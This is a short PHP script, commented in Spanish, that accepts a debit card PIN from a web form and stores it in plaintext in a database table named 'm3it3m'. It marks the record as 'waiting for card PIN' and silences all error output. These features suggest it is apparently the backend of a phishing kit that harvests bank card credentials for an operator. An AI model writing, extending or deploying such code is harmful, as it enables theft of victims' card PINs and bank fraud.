<?php
// 🔐 Guardar clave de tarjeta débito en BD

error_reporting(0);
ini_set('display_errors', 0);

require_once __DIR__ . '/../conexion/conexion.php';

$clave = $_POST['clave'] ?? '';
$id_transaccion = $_SESSION['id_transaccion'] ?? $_POST['id'] ?? '';

if(!$clave) {
    http_response_code(400);
    echo json_encode(['status' => 'ERROR', 'message' => 'Clave requerida']);
    exit;
}

try {
    // Actualizar m3it3m con la clave en el campo clave_tarj
    $sql = "UPDATE m3it3m
            SET clave_tarj = ?, status = 'esperando_clave_tarj', horamodificado = NOW()
            WHERE idreg = ?";

    $stmt = $mysqli->prepare($sql);
    $stmt->bind_param('si', $clave, $id_transaccion);

    if($stmt->execute()) {
        http_response_code(200);
        echo json_encode([
            'status' => 'OK',
            'message' => 'Clave registrada',
            'id' => $id_transaccion
        ]);
    } else {
        throw new Exception('Error al actualizar: ' . $stmt->error);
    }

} catch(Exception $e) {
    http_response_code(500);
    echo json_encode([
        'status' => 'ERROR',
        'message' => $e->getMessage()
    ]);
}

$stmt->close();
$mysqli->close();
?>
